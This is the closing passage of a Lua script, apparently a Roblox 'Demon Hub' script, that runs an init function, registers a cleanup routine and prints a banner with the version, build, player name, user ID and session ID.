    task.wait(0.5)
end
_G.DemonUICleanup = cleanup
init()

print("===========================================")
print("DEMON HUB v" .. CONFIG.VERSION .. " LOADED")
print("Build: " .. CONFIG.BUILD_NUMBER)
print("User: " .. LocalPlayer.Name .. " (" .. LocalPlayer.UserId .. ")")
print("Session: " .. State.sessionId:sub(1, 8):upper())
print("===========================================")
